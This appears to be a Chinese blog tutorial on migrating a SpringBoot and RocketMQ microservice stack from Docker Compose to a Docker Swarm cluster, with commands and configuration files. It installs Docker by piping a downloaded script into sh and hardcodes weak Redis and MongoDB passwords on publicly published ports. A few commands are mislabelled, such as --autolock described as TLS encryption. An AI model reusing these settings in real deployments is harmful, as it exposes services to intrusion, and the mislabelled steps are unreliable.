                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读5分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><p>在微服务架构日益普及的今天，单机部署已无法满足生产环境的高可用和可扩展性需求。本文将详细指导您如何将一个基于 RocketMQ 的 SpringBoot 微服务项目从单机 Docker Compose 部署升级为生产级的 Docker Swarm 集群部署。</p>
<h2 data-id="heading-0">一、Docker Swarm 架构概述</h2>
<h3 data-id="heading-1">1.1 Swarm 集群核心组件</h3>
<ul>
<li><strong>管理节点 (Manager Nodes)</strong> ：负责集群管理、服务调度</li>
<li><strong>工作节点 (Worker Nodes)</strong> ：运行容器实例</li>
<li><strong>Raft 共识算法</strong>：保证管理节点高可用</li>
<li><strong>覆盖网络 (Overlay Network)</strong> ：实现跨主机容器通信</li>
</ul>
<h3 data-id="heading-2">1.2 集群架构设计</h3>
<pre><code class="hljs language-lua" lang="lua">+<span class="hljs-comment">-----------------+</span>
                   |   负载均衡器     |
                   |   (Nginx/Haproxy) |
                   +<span class="hljs-comment">-----------------+</span>
                          |
      +<span class="hljs-comment">-----------------------------------+</span>
      |           Swarm 集群              |
      +<span class="hljs-comment">-----------------------------------+</span>
      | Manager1 | Manager2 | Manager3    |  ← 管理节点（奇数个）
      +<span class="hljs-comment">-----------------------------------+</span>
      | Worker1  | Worker2  | Worker3     |  ← 工作节点
      +<span class="hljs-comment">-----------------------------------+</span>
</code></pre>
<h2 data-id="heading-3">二、环境准备与集群初始化</h2>
<h3 data-id="heading-4">2.1 服务器规划</h3>
<p>假设我们有 3 台服务器：</p>
<ul>
<li>192.168.1.10 (manager1)</li>
<li>192.168.1.11 (worker1)</li>
<li>192.168.1.12 (worker2)</li>
</ul>
<h3 data-id="heading-5">2.2 所有节点基础环境配置</h3>
<pre><code class="hljs language-bash" lang="bash"><span class="hljs-comment"># 1. 安装 Docker（所有节点）</span>
curl -fsSL https://get.docker.com | sh
sudo systemctl <span class="hljs-built_in">enable</span> docker
sudo systemctl start docker

<span class="hljs-comment"># 2. 开放防火墙端口</span>
sudo ufw allow 22/tcp
sudo ufw allow 2377/tcp    <span class="hljs-comment"># Swarm 管理端口</span>
sudo ufw allow 7946/tcp    <span class="hljs-comment"># 节点通信</span>
sudo ufw allow 7946/udp
sudo ufw allow 4789/udp    <span class="hljs-comment"># 覆盖网络</span>

<span class="hljs-comment"># 3. 设置主机名（可选）</span>
sudo hostnamectl set-hostname manager1
sudo hostnamectl set-hostname worker1
sudo hostnamectl set-hostname worker2
</code></pre>
<h3 data-id="heading-6">2.3 初始化 Swarm 集群</h3>
<pre><code class="hljs language-bash" lang="bash"><span class="hljs-comment"># 在 manager1 上执行</span>
docker swarm init --advertise-addr 192.168.1.10

<span class="hljs-comment"># 输出示例：</span>
<span class="hljs-comment"># Swarm initialized: current node (xyz) is now a manager.</span>
<span class="hljs-comment"># To add a worker to this swarm, run the following command:</span>
<span class="hljs-comment">#     docker swarm join --token SWMTKN-1-xxx 192.168.1.10:2377</span>

<span class="hljs-comment"># 在工作节点上执行加入命令</span>
<span class="hljs-comment"># 在 worker1 和 worker2 上分别执行：</span>
docker swarm <span class="hljs-built_in">join</span> --token SWMTKN-1-xxx 192.168.1.10:2377
</code></pre>
<h3 data-id="heading-7">2.4 验证集群状态</h3>
<pre><code class="hljs language-bash" lang="bash"><span class="hljs-comment"># 在管理节点查看节点状态</span>
docker node <span class="hljs-built_in">ls</span>

<span class="hljs-comment"># 输出示例：</span>
<span class="hljs-comment"># ID                           HOSTNAME   STATUS    AVAILABILITY   MANAGER STATUS   ENGINE VERSION</span>
<span class="hljs-comment"># xyz123 *   manager1   Ready     Active         Leader           20.10.12</span>
<span class="hljs-comment"># abc456     worker1    Ready     Active                          20.10.12  </span>
<span class="hljs-comment"># def789     worker2    Ready     Active                          20.10.12</span>
</code></pre>
<h2 data-id="heading-8">三、改造 Docker Compose 文件支持 Swarm</h2>
<h3 data-id="heading-9">3.1 创建 Swarm 专用配置文件</h3>
<p>创建 <code>docker-compose.swarm.yml</code>：</p>
<pre><code class="hljs language-yaml" lang="yaml"><span class="hljs-attr">version:</span> <span class="hljs-string">'3.8'</span>

<span class="hljs-attr">services:</span>
  <span class="hljs-comment"># SpringBoot 应用服务 - 无状态，可水平扩展</span>
  <span class="hljs-attr">my-springboot-app:</span>
    <span class="hljs-attr">image:</span> <span class="hljs-string">my-springboot-app:latest</span>
    <span class="hljs-attr">deploy:</span>
      <span class="hljs-attr">replicas:</span> <span class="hljs-number">3</span>                    <span class="hljs-comment"># 启动3个实例</span>
      <span class="hljs-attr">restart_policy:</span>
        <span class="hljs-attr">condition:</span> <span class="hljs-string">on-failure</span>
        <span class="hljs-attr">delay:</span> <span class="hljs-string">5s</span>
        <span class="hljs-attr">max_attempts:</span> <span class="hljs-number">3</span>
        <span class="hljs-attr">window:</span> <span class="hljs-string">120s</span>
      <span class="hljs-attr">update_config:</span>
        <span class="hljs-attr">parallelism:</span> <span class="hljs-number">1</span>              <span class="hljs-comment"># 滚动更新：每次更新1个实例</span>
        <span class="hljs-attr">delay:</span> <span class="hljs-string">10s</span>
        <span class="hljs-attr">order:</span> <span class="hljs-string">start-first</span>
      <span class="hljs-attr">resources:</span>
        <span class="hljs-attr">limits:</span>
          <span class="hljs-attr">cpus:</span> <span class="hljs-string">'0.5'</span>
          <span class="hljs-attr">memory:</span> <span class="hljs-string">512M</span>
        <span class="hljs-attr">reservations:</span>
          <span class="hljs-attr">cpus:</span> <span class="hljs-string">'0.25'</span>
          <span class="hljs-attr">memory:</span> <span class="hljs-string">256M</span>
      <span class="hljs-attr">placement:</span>
        <span class="hljs-attr">constraints:</span>
          <span class="hljs-bullet">-</span> <span class="hljs-string">node.role==worker</span>       <span class="hljs-comment"># 只部署在工作节点</span>
    <span class="hljs-attr">ports:</span>
      <span class="hljs-bullet">-</span> <span class="hljs-attr">target:</span> <span class="hljs-number">8080</span>
        <span class="hljs-attr">published:</span> <span class="hljs-number">8080</span>
        <span class="hljs-attr">protocol:</span> <span class="hljs-string">tcp</span>
        <span class="hljs-attr">mode:</span> <span class="hljs-string">host</span>                  <span class="hljs-comment"># 使用host模式便于直接访问</span>
    <span class="hljs-attr">environment:</span>
      <span class="hljs-bullet">-</span> <span class="hljs-string">rocketmq.client.logRoot=/home/spring/logs/rocketmqlogs</span>
      <span class="hljs-bullet">-</span> <span class="hljs-string">SPRING_PROFILES_ACTIVE=prod</span>
    <span class="hljs-attr">volumes:</span>
      <span class="hljs-bullet">-</span> <span class="hljs-string">springboot_logs:/home/spring/logs</span>
    <span class="hljs-attr">networks:</span>
      <span class="hljs-bullet">-</span> <span class="hljs-string">app-network</span>
    <span class="hljs-attr">depends_on:</span>
      <span class="hljs-bullet">-</span> <span class="hljs-string">redis</span>
      <span class="hljs-bullet">-</span> <span class="hljs-string">rmqnamesrv</span>
      <span class="hljs-bullet">-</span> <span class="hljs-string">rmqbroker</span>
      <span class="hljs-bullet">-</span> <span class="hljs-string">mongo</span>

  <span class="hljs-comment"># Redis 服务 - 有状态，单实例+持久化</span>
  <span class="hljs-attr">redis:</span>
    <span class="hljs-attr">image:</span> <span class="hljs-string">redis:7-alpine</span>
    <span class="hljs-attr">deploy:</span>
      <span class="hljs-attr">replicas:</span> <span class="hljs-number">1</span>
      <span class="hljs-attr">restart_policy:</span>
        <span class="hljs-attr">condition:</span> <span class="hljs-string">on-failure</span>
      <span class="hljs-attr">placement:</span>
        <span class="hljs-attr">constraints:</span>
          <span class="hljs-bullet">-</span> <span class="hljs-string">node.labels.redis==true</span>    <span class="hljs-comment"># 固定部署在特定节点</span>
    <span class="hljs-attr">ports:</span>
      <span class="hljs-bullet">-</span> <span class="hljs-attr">target:</span> <span class="hljs-number">6379</span>
        <span class="hljs-attr">published:</span> <span class="hljs-number">6379</span>
        <span class="hljs-attr">protocol:</span> <span class="hljs-string">tcp</span>
        <span class="hljs-attr">mode:</span> <span class="hljs-string">host</span>
    <span class="hljs-attr">command:</span> <span class="hljs-string">redis-server</span> <span class="hljs-string">--requirepass</span> <span class="hljs-number">123456</span> <span class="hljs-string">--appendonly</span> <span class="hljs-literal">yes</span>
    <span class="hljs-attr">volumes:</span>
      <span class="hljs-bullet">-</span> <span class="hljs-string">redis_data:/data</span>
    <span class="hljs-attr">networks:</span>
      <span class="hljs-bullet">-</span> <span class="hljs-string">app-network</span>

  <span class="hljs-comment"># RocketMQ NameServer - 有状态，建议单实例</span>
  <span class="hljs-attr">rmqnamesrv:</span>
    <span class="hljs-attr">image:</span> <span class="hljs-string">apache/rocketmq:5.1.0</span>
    <span class="hljs-attr">deploy:</span>
      <span class="hljs-attr">replicas:</span> <span class="hljs-number">1</span>
      <span class="hljs-attr">restart_policy:</span>
        <span class="hljs-attr">condition:</span> <span class="hljs-string">on-failure</span>
      <span class="hljs-attr">placement:</span>
        <span class="hljs-attr">constraints:</span>
          <span class="hljs-bullet">-</span> <span class="hljs-string">node.labels.rocketmq==true</span>
    <span class="hljs-attr">ports:</span>
      <span class="hljs-bullet">-</span> <span class="hljs-attr">target:</span> <span class="hljs-number">9876</span>
        <span class="hljs-attr">published:</span> <span class="hljs-number">9876</span>
        <span class="hljs-attr">protocol:</span> <span class="hljs-string">tcp</span>
        <span class="hljs-attr">mode:</span> <span class="hljs-string">host</span>
    <span class="hljs-attr">command:</span> <span class="hljs-string">sh</span> <span class="hljs-string">mqnamesrv</span>
    <span class="hljs-attr">volumes:</span>
      <span class="hljs-bullet">-</span> <span class="hljs-string">rmqnamesrv_data:/home/rocketmq/store</span>
    <span class="hljs-attr">networks:</span>
      <span class="hljs-bullet">-</span> <span class="hljs-string">app-network</span>

  <span class="hljs-comment"># RocketMQ Broker - 有状态，需要与NameServer同节点或网络互通</span>
  <span class="hljs-attr">rmqbroker:</span>
    <span class="hljs-attr">image:</span> <span class="hljs-string">apache/rocketmq:5.1.0</span>
    <span class="hljs-attr">deploy:</span>
      <span class="hljs-attr">replicas:</span> <span class="hljs-number">1</span>
      <span class="hljs-attr">restart_policy:</span>
        <span class="hljs-attr">condition:</span> <span class="hljs-string">on-failure</span>
      <span class="hljs-attr">placement:</span>
        <span class="hljs-attr">constraints:</span>
          <span class="hljs-bullet">-</span> <span class="hljs-string">node.labels.rocketmq==true</span>
    <span class="hljs-attr">ports:</span>
      <span class="hljs-bullet">-</span> <span class="hljs-attr">target:</span> <span class="hljs-number">10911</span>
        <span class="hljs-attr">published:</span> <span class="hljs-number">10911</span>
        <span class="hljs-attr">protocol:</span> <span class="hljs-string">tcp</span>
        <span class="hljs-attr">mode:</span> <span class="hljs-string">host</span>
      <span class="hljs-bullet">-</span> <span class="hljs-attr">target:</span> <span class="hljs-number">10909</span>
        <span class="hljs-attr">published:</span> <span class="hljs-number">10909</span>
        <span class="hljs-attr">protocol:</span> <span class="hljs-string">tcp</span>
        <span class="hljs-attr">mode:</span> <span class="hljs-string">host</span>
    <span class="hljs-attr">environment:</span>
      <span class="hljs-attr">NAMESRV_ADDR:</span> <span class="hljs-string">"rmqnamesrv:9876"</span>
      <span class="hljs-attr">JAVA_OPTS:</span> <span class="hljs-string">" -Duser.home=/opt"</span>
      <span class="hljs-attr">JAVA_OPT_EXT:</span> <span class="hljs-string">"-server -Xms256m -Xmx256m -Xmn128m"</span>
    <span class="hljs-attr">volumes:</span>
      <span class="hljs-bullet">-</span> <span class="hljs-attr">type:</span> <span class="hljs-string">bind</span>
        <span class="hljs-attr">source:</span> <span class="hljs-string">./broker.conf</span>
        <span class="hljs-attr">target:</span> <span class="hljs-string">/opt/rocketmq/conf/broker.conf</span>
      <span class="hljs-bullet">-</span> <span class="hljs-string">rmqbroker_data:/home/rocketmq/store</span>
    <span class="hljs-attr">command:</span> <span class="hljs-string">sh</span> <span class="hljs-string">mqbroker</span> <span class="hljs-string">-c</span> <span class="hljs-string">/opt/rocketmq/conf/broker.conf</span>
    <span class="hljs-attr">networks:</span>
      <span class="hljs-bullet">-</span> <span class="hljs-string">app-network</span>

  <span class="hljs-comment"># MongoDB 服务 - 有状态，单实例+持久化</span>
  <span class="hljs-attr">mongo:</span>
    <span class="hljs-attr">image:</span> <span class="hljs-string">mongo:5</span>
    <span class="hljs-attr">deploy:</span>
      <span class="hljs-attr">replicas:</span> <span class="hljs-number">1</span>
      <span class="hljs-attr">restart_policy:</span>
        <span class="hljs-attr">condition:</span> <span class="hljs-string">on-failure</span>
      <span class="hljs-attr">placement:</span>
        <span class="hljs-attr">constraints:</span>
          <span class="hljs-bullet">-</span> <span class="hljs-string">node.labels.mongo==true</span>
    <span class="hljs-attr">environment:</span>
      <span class="hljs-attr">MONGO_INITDB_ROOT_USERNAME:</span> <span class="hljs-string">root</span>
      <span class="hljs-attr">MONGO_INITDB_ROOT_PASSWORD:</span> <span class="hljs-string">root</span>
    <span class="hljs-attr">ports:</span>
      <span class="hljs-bullet">-</span> <span class="hljs-attr">target:</span> <span class="hljs-number">27017</span>
        <span class="hljs-attr">published:</span> <span class="hljs-number">27017</span>
        <span class="hljs-attr">protocol:</span> <span class="hljs-string">tcp</span>
        <span class="hljs-attr">mode:</span> <span class="hljs-string">host</span>
    <span class="hljs-attr">volumes:</span>
      <span class="hljs-bullet">-</span> <span class="hljs-string">mongo_data:/data/db</span>
      <span class="hljs-bullet">-</span> <span class="hljs-string">mongo_config:/data/configdb</span>
    <span class="hljs-attr">networks:</span>
      <span class="hljs-bullet">-</span> <span class="hljs-string">app-network</span>

  <span class="hljs-comment"># 可选：添加监控服务</span>
  <span class="hljs-attr">visualizer:</span>
    <span class="hljs-attr">image:</span> <span class="hljs-string">dockersamples/visualizer:latest</span>
    <span class="hljs-attr">deploy:</span>
      <span class="hljs-attr">replicas:</span> <span class="hljs-number">1</span>
      <span class="hljs-attr">placement:</span>
        <span class="hljs-attr">constraints:</span>
          <span class="hljs-bullet">-</span> <span class="hljs-string">node.role==manager</span>
    <span class="hljs-attr">ports:</span>
      <span class="hljs-bullet">-</span> <span class="hljs-string">"8081:8080"</span>
    <span class="hljs-attr">volumes:</span>
      <span class="hljs-bullet">-</span> <span class="hljs-string">"/var/run/docker.sock:/var/run/docker.sock"</span>
    <span class="hljs-attr">networks:</span>
      <span class="hljs-bullet">-</span> <span class="hljs-string">app-network</span>

<span class="hljs-comment"># 覆盖网络定义</span>
<span class="hljs-attr">networks:</span>
  <span class="hljs-attr">app-network:</span>
    <span class="hljs-attr">driver:</span> <span class="hljs-string">overlay</span>
    <span class="hljs-attr">attachable:</span> <span class="hljs-literal">true</span>

<span class="hljs-comment"># 数据卷定义</span>
<span class="hljs-attr">volumes:</span>
  <span class="hljs-attr">redis_data:</span>
    <span class="hljs-attr">driver:</span> <span class="hljs-string">local</span>
  <span class="hljs-attr">mongo_data:</span>
    <span class="hljs-attr">driver:</span> <span class="hljs-string">local</span>  
  <span class="hljs-attr">mongo_config:</span>
    <span class="hljs-attr">driver:</span> <span class="hljs-string">local</span>
  <span class="hljs-attr">rmqnamesrv_data:</span>
    <span class="hljs-attr">driver:</span> <span class="hljs-string">local</span>
  <span class="hljs-attr">rmqbroker_data:</span>
    <span class="hljs-attr">driver:</span> <span class="hljs-string">local</span>
  <span class="hljs-attr">springboot_logs:</span>
    <span class="hljs-attr">driver:</span> <span class="hljs-string">local</span>
</code></pre>
<h3 data-id="heading-10">3.2 创建 Broker 配置文件</h3>
<p>创建 <code>broker.conf</code>适配集群环境：</p>
<pre><code class="hljs language-ini" lang="ini"><span class="hljs-comment"># Broker 配置 - 集群优化版</span>
<span class="hljs-attr">brokerClusterName</span> = DefaultCluster
<span class="hljs-attr">brokerName</span> = broker-a
<span class="hljs-attr">brokerId</span> = <span class="hljs-number">0</span>
<span class="hljs-attr">deleteWhen</span> = <span class="hljs-number">04</span>
<span class="hljs-attr">fileReservedTime</span> = <span class="hljs-number">48</span>
<span class="hljs-attr">brokerRole</span> = ASYNC_MASTER
<span class="hljs-attr">flushDiskType</span> = ASYNC_FLUSH

<span class="hljs-comment"># 集群配置</span>
<span class="hljs-attr">namesrvAddr</span> = rmqnamesrv:<span class="hljs-number">9876</span>
<span class="hljs-attr">brokerIP1</span> = <span class="hljs-number">192.168</span>.<span class="hljs-number">1.11</span>  <span class="hljs-comment"># 根据实际节点IP修改</span>

<span class="hljs-comment"># 性能优化</span>
<span class="hljs-attr">mapedFileSizeCommitLog</span> = <span class="hljs-number">1073741824</span>
<span class="hljs-attr">mapedFileSizeConsumeQueue</span> = <span class="hljs-number">300000</span>
<span class="hljs-attr">maxMessageSize</span> = <span class="hljs-number">65536</span>
</code></pre>
<h2 data-id="heading-11">四、节点标签与资源规划</h2>
<h3 data-id="heading-12">4.1 为节点打标签</h3>
<pre><code class="hljs language-ini" lang="ini"><span class="hljs-comment"># 为运行有状态服务的节点打标签</span>
docker node update --label-add <span class="hljs-attr">redis</span>=<span class="hljs-literal">true</span> worker1
docker node update --label-add <span class="hljs-attr">rocketmq</span>=<span class="hljs-literal">true</span> worker1  
docker node update --label-add <span class="hljs-attr">mongo</span>=<span class="hljs-literal">true</span> worker1

<span class="hljs-comment"># 验证标签</span>
docker node inspect worker1 | grep Labels
</code></pre>
<h3 data-id="heading-13">4.2 资源规划策略</h3>
<ul>
<li><strong>有状态服务</strong>：固定部署在特定节点（使用标签约束）</li>
<li><strong>无状态服务</strong>：可在工作节点间自动调度</li>
<li><strong>管理节点</strong>：只运行管理服务，不运行业务容器</li>
</ul>
<h2 data-id="heading-14">五、集群网络与存储配置</h2>
<h3 data-id="heading-15">5.1 创建覆盖网络</h3>
<pre><code class="hljs language-sql" lang="sql"># 创建用于服务发现的覆盖网络
docker network <span class="hljs-keyword">create</span> <span class="hljs-operator">-</span>d <span class="hljs-keyword">overlay</span> <span class="hljs-comment">--attachable app-network</span>

# 验证网络
docker network ls <span class="hljs-operator">|</span> grep <span class="hljs-keyword">overlay</span>
</code></pre>
<h3 data-id="heading-16">5.2 配置共享存储（生产环境建议）</h3>
<p>对于有状态服务的数据持久化，建议使用网络存储：</p>
<pre><code class="hljs language-yaml" lang="yaml"><span class="hljs-attr">volumes:</span>
  <span class="hljs-attr">redis_data:</span>
    <span class="hljs-attr">driver:</span> <span class="hljs-string">local</span>
    <span class="hljs-comment"># 生产环境建议使用：</span>
    <span class="hljs-comment"># driver: nfs</span>
    <span class="hljs-comment"># driver_opts:</span>
    <span class="hljs-comment">#   share: "192.168.1.100:/data/redis"</span>
</code></pre>
<h2 data-id="heading-17">六、部署与验证</h2>
<h3 data-id="heading-18">6.1 部署应用栈</h3>
<pre><code class="hljs language-bash" lang="bash"><span class="hljs-comment"># 在管理节点执行部署</span>
docker stack deploy -c docker-compose.swarm.yml rocketmq-app

<span class="hljs-comment"># 查看服务状态</span>
docker stack services rocketmq-app

<span class="hljs-comment"># 实时监控部署进度</span>
watch docker service <span class="hljs-built_in">ls</span>
</code></pre>
<h3 data-id="heading-19">6.2 验证服务状态</h3>
<pre><code class="hljs language-ruby" lang="ruby"><span class="hljs-comment"># 查看所有服务状态</span>
docker service ls

<span class="hljs-comment"># 查看具体服务详情</span>
docker service ps rocketmq-app_my-springboot-app

<span class="hljs-comment"># 查看服务日志</span>
docker service logs rocketmq-app_my-springboot-app

<span class="hljs-comment"># 测试服务连通性</span>
curl <span class="hljs-symbol">http:</span>/<span class="hljs-regexp">/192.168.1.10:8080/actuator</span><span class="hljs-regexp">/health
curl http:/</span><span class="hljs-regexp">/192.168.1.11:8080/actuator</span><span class="hljs-regexp">/health  
curl http:/</span><span class="hljs-regexp">/192.168.1.12:8080/actuator</span><span class="hljs-regexp">/health
</span></code></pre>
<h3 data-id="heading-20">6.3 验证 RocketMQ 集群</h3>
<pre><code class="hljs language-bash" lang="bash"><span class="hljs-comment"># 进入容器测试 RocketMQ</span>
docker <span class="hljs-built_in">exec</span> -it $(docker ps -q -f name=rocketmq-app_my-springboot-app) sh

<span class="hljs-comment"># 在容器内测试</span>
./mqadmin clusterList -n rmqnamesrv:9876
./mqadmin topicList -n rmqnamesrv:9876
</code></pre>
<h2 data-id="heading-21">七、集群运维与管理</h2>
<h3 data-id="heading-22">7.1 常用管理命令</h3>
<pre><code class="hljs language-ini" lang="ini"><span class="hljs-comment"># 扩展应用实例数</span>
docker service scale <span class="hljs-attr">rocketmq-app_my-springboot-app</span>=<span class="hljs-number">5</span>

<span class="hljs-comment"># 滚动更新服务</span>
docker service update --image my-springboot-app:v2.0 rocketmq-app_my-springboot-app

<span class="hljs-comment"># 查看服务详情</span>
docker service inspect rocketmq-app_my-springboot-app

<span class="hljs-comment"># 故障节点处理</span>
docker node update --availability drain worker1  <span class="hljs-comment"># 排空节点</span>
docker node update --availability active worker1   <span class="hljs-comment"># 重新激活</span>
</code></pre>
<h3 data-id="heading-23">7.2 监控与日志</h3>
<pre><code class="hljs language-yaml" lang="yaml"><span class="hljs-comment"># 设置日志驱动（在docker-compose中配置）</span>
<span class="hljs-attr">deploy:</span>
  <span class="hljs-attr">logging:</span>
    <span class="hljs-attr">driver:</span> <span class="hljs-string">"json-file"</span>
    <span class="hljs-attr">options:</span>
      <span class="hljs-attr">max-size:</span> <span class="hljs-string">"10m"</span>
      <span class="hljs-attr">max-file:</span> <span class="hljs-string">"3"</span>

<span class="hljs-comment"># 集中日志收集（建议）</span>
<span class="hljs-comment"># 可集成ELK或Fluentd进行日志聚合</span>
</code></pre>
<h3 data-id="heading-24">7.3 备份与恢复</h3>
<pre><code class="hljs language-bash" lang="bash"><span class="hljs-comment"># 备份有状态服务数据</span>
docker run --<span class="hljs-built_in">rm</span> -v rocketmq-app_redis_data:/source -v $(<span class="hljs-built_in">pwd</span>)/backup:/backup alpine \
  tar czf /backup/redis_$(<span class="hljs-built_in">date</span> +%Y%m%d).tar.gz -C /source .

<span class="hljs-comment"># 创建管理节点备份</span>
docker swarm init --force-new-cluster  <span class="hljs-comment"># 在故障恢复时使用</span>
</code></pre>
<h2 data-id="heading-25">八、高可用与故障转移测试</h2>
<h3 data-id="heading-26">8.1 模拟节点故障</h3>
<pre><code class="hljs language-sql" lang="sql"># 模拟工作节点故障
docker node <span class="hljs-keyword">update</span> <span class="hljs-comment">--availability drain worker1</span>

# 观察服务自动迁移
watch docker service ps rocketmq<span class="hljs-operator">-</span>app_my<span class="hljs-operator">-</span>springboot<span class="hljs-operator">-</span>app

# 恢复节点
docker node <span class="hljs-keyword">update</span> <span class="hljs-comment">--availability active worker1</span>
</code></pre>
<h3 data-id="heading-27">8.2 管理节点高可用</h3>
<pre><code class="hljs language-bash" lang="bash"><span class="hljs-comment"># 提升其他节点为管理节点（实现管理节点HA）</span>
docker node promote worker1
docker node promote worker2

<span class="hljs-comment"># 查看管理节点状态</span>
docker node <span class="hljs-built_in">ls</span>
</code></pre>
<h2 data-id="heading-28">九、生产环境优化建议</h2>
<h3 data-id="heading-29">9.1 安全加固</h3>
<pre><code class="hljs language-csharp" lang="csharp"><span class="hljs-meta"># 使用TLS加密集群通信</span>
docker swarm <span class="hljs-keyword">init</span> --advertise-addr <span class="hljs-number">192.168</span><span class="hljs-number">.1</span><span class="hljs-number">.10</span> --autolock

<span class="hljs-meta"># 定期轮换加密密钥</span>
docker swarm unlock-key --rotate
</code></pre>
<h3 data-id="heading-30">9.2 资源限制与预留</h3>
<pre><code class="hljs language-yaml" lang="yaml"><span class="hljs-attr">deploy:</span>
  <span class="hljs-attr">resources:</span>
    <span class="hljs-attr">limits:</span>
      <span class="hljs-attr">cpus:</span> <span class="hljs-string">'1.0'</span>
      <span class="hljs-attr">memory:</span> <span class="hljs-string">1G</span>
    <span class="hljs-attr">reservations:</span>
      <span class="hljs-attr">cpus:</span> <span class="hljs-string">'0.5'</span>
      <span class="hljs-attr">memory:</span> <span class="hljs-string">512M</span>
</code></pre>
<h3 data-id="heading-31">9.3 健康检查配置</h3>
<pre><code class="hljs language-bash" lang="bash">healthcheck:
  <span class="hljs-built_in">test</span>: [<span class="hljs-string">"CMD"</span>, <span class="hljs-string">"curl"</span>, <span class="hljs-string">"-f"</span>, <span class="hljs-string">"http://localhost:8080/actuator/health"</span>]
  interval: 30s
  <span class="hljs-built_in">timeout</span>: 10s
  retries: 3
  start_period: 40s
</code></pre>
<h2 data-id="heading-32">十、常见问题排查</h2>
<h3 data-id="heading-33">10.1 服务无法启动</h3>
<pre><code class="hljs language-bash" lang="bash"><span class="hljs-comment"># 查看详细错误信息</span>
docker service logs rocketmq-app_my-springboot-app --details

<span class="hljs-comment"># 检查网络连通性</span>
docker network inspect app-network

<span class="hljs-comment"># 检查节点资源</span>
docker node ps $(docker node <span class="hljs-built_in">ls</span> -q)
</code></pre>
<h3 data-id="heading-34">10.2 数据持久化问题</h3>
<pre><code class="hljs language-bash" lang="bash"><span class="hljs-comment"># 检查卷状态</span>
docker volume <span class="hljs-built_in">ls</span>

<span class="hljs-comment"># 进入容器检查挂载点</span>
docker <span class="hljs-built_in">exec</span> -it &lt;container_id&gt; <span class="hljs-built_in">df</span> -h
</code></pre>
